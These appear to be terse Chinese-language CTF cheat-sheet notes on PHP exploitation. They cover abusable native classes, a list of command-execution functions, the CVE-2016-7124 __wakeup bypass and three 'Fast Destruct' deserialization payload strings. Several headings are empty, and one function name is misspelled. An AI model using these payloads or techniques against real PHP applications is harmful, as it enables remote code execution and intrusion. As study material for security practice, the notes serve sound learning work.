### 原生类利用
Error
Exception
SoapClient
#### DirectoryIterator

SimpleXMLElement

参考
https://www.anquanke.com/post/id/238482

## 命令执行函数
```php
system,exec,shell_exec,fopen,pcmtl_exe,passthru,popen

```
### phpinfo信息收集

## 反序列化技巧
### 绕过wakeup

> CVE-2016-7124
> 利用条件：
> PHP5 < 5.6.25
> ​PHP7 < 7.0.10
> 
> 利用方式：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行
### Fast Destruct
```php
$payload = 'a:2:{i:0;O:7:"classes":0:{}i:1;O:4:"Test":0:{}';
$payload = 'a:3:{i:0;O:7:"classes":0:{}i:1;O:4:"Test":0:{}}';
$payload = 'a:2:{i:0;O:7:"classes":0:{}i:1;O:4:"Test":0:{};}';
```
